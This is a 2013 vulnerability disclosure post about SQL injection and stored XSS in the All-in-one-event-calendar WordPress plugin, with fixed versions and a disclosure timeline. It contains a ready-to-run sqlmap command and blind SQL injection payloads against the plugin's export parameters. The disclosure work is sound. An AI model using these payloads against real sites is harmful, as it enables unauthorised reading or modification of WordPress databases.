+++
Description = "SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin"
title = "SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin"
date = "2013-11-14T22:05:00+01:00"
+++

During a recent security audit I found multiple vulnerabilities in the Wordpress plugin "all-in-one-event-calendar".
There is a lite version provided through the Wordpress site ([http://wordpress.org/plugins/all-in-one-event-calendar/](http://wordpress.org/plugins/all-in-one-event-calendar/)), and a standard version provided through a third party site ([http://time.ly/](http://time.ly/)).
Both versions were tested and are vulnerable to the reported issues.

PS: There is also a paid pro version. This was not tested but it's likely also vulnerable to the mentioned issues.

<!--more-->

**Tested versions:**

Lite Plugin: 1.9

Standard Plugin: 1.10

**SQL-Injection through export function**

The plugin offers an export function to export the event to either iCal format or Google Calender.

The Parameters "ai1ec_cat_ids", "ai1ec_post_ids" and "ai1ec_tag_ids" are all vulnerable to SQL-Injection.
By exploiting this vulnerability, a user is able to read or modify the whole Wordpress Database, or even more depending on the database configuration.

**Vulnerable code:**

[http://plugins.trac.wordpress.org/browser/all-in-one-event-calendar/tags/1.9/app/helper/class-ai1ec-calendar-helper.php#L1146](http://plugins.trac.wordpress.org/browser/all-in-one-event-calendar/tags/1.9/app/helper/class-ai1ec-calendar-helper.php#L1146)

**Proof of concept:**

To exploit this SQL-Injection through sqlmap ([https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)):
Prerequisite: You need at least one event

```
python sqlmap.py --url "http://IP/wordpress/?plugin=all-in-one-event-calendar&amp;controller=ai1ec_exporter_controller&amp;action=export_events&amp;cb=5032359096&amp;ai1ec_cat_ids=&amp;ai1ec_tag_ids=&amp;ai1ec_post_ids=" -p ai1ec_tag_ids,ai1ec_post_ids,ai1ec_cat_ids --risk 3 --level 3 --dbms mysql
```

**sqlmap Output:**

```
Place: GET
Parameter: ai1ec_cat_ids
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause
Payload: plugin=all-in-one-event-calendar&amp;controller=ai1ec_exporter_controller&amp;action=export_events&amp;cb=5032359096&amp;ai1ec_cat_ids=-8478) OR (5188=5188) AND (1391=1391&amp;ai1ec_tag_ids=&amp;ai1ec_post_ids=
Type: AND/OR time-based blind
Title: MySQL &gt; 5.0.11 OR time-based blind
Payload: plugin=all-in-one-event-calendar&amp;controller=ai1ec_exporter_controller&amp;action=export_events&amp;cb=5032359096&amp;ai1ec_cat_ids=-2330) OR 3582=SLEEP(5) AND (8356=8356&amp;ai1ec_tag_ids=&amp;ai1ec_post_ids=

Place: GET
Parameter: ai1ec_post_ids
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause
Payload: plugin=all-in-one-event-calendar&amp;controller=ai1ec_exporter_controller&amp;action=export_events&amp;cb=5032359096&amp;ai1ec_cat_ids=&amp;ai1ec_tag_ids=&amp;ai1ec_post_ids=-8080) OR (8936=8936) AND (6501=6501
Type: AND/OR time-based blind
Title: MySQL &gt; 5.0.11 OR time-based blind
Payload: plugin=all-in-one-event-calendar&amp;controller=ai1ec_exporter_controller&amp;action=export_events&amp;cb=5032359096&amp;ai1ec_cat_ids=&amp;ai1ec_tag_ids=&amp;ai1ec_post_ids=-2544) OR 1170=SLEEP(5) AND (6134=6134

Place: GET
Parameter: ai1ec_tag_ids
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause
Payload: plugin=all-in-one-event-calendar&amp;controller=ai1ec_exporter_controller&amp;action=export_events&amp;cb=5032359096&amp;ai1ec_cat_ids=&amp;ai1ec_tag_ids=-6274) OR (5133=5133) AND (6779=6779&amp;ai1ec_post_ids=
Type: AND/OR time-based blind
Title: MySQL &gt; 5.0.11 OR time-based blind
Payload: plugin=all-in-one-event-calendar&amp;controller=ai1ec_exporter_controller&amp;action=export_events&amp;cb=5032359096&amp;ai1ec_cat_ids=&amp;ai1ec_tag_ids=-1181) OR 8944=SLEEP(5) AND (4367=4367&amp;ai1ec_post_ids=
```

This proves, that all 3 Parameters are vulnerable to SQL-Injection. Due to some Parameter processing before the Statement is executed (e.g. split by comma), you need to write a script to exploit this vulnerability, or use a tool like sqlmap.

**Cross Site Scripting (XSS) in location details:**

When entering Javascript code in the fields "Venue Name" and "Address" when creating a new event, it is possible to execute script code in the context of the user viewing the event.

All values should be properly escaped before they are output to HTML. This issue is present through all default Calendar Themes.

**All Issues were fixed in the following versions:**

_Lite version:_ 1.10

_Standard version:_ 1.10.1-standard

**Timeline:**

03.07.2013: Informed time.ly, secunia and wordpress about the vulnerabilities

03.07.2013: Received mail from time.ly saying they forwarded it to their developers

23.07.2013: Asked for an ETA because the issue is still present

23.07.2013: time.ly submitted fixed plugin to wordpress repository

24.07.2013: lite Plugin fixed ([http://plugins.trac.wordpress.org/changeset/745755/all-in-one-event-calendar/tags/1.10](http://plugins.trac.wordpress.org/changeset/745755/all-in-one-event-calendar/tags/1.10))

03.10.2013: Standard Plugin fixed ([http://time.ly/1-10-1-now-available-for-some-standard-users/](http://time.ly/1-10-1-now-available-for-some-standard-users/))

**Additional URLs:**
_Secunia Advisory:_ [http://secunia.com/advisories/54038/](http://secunia.com/advisories/54038/)
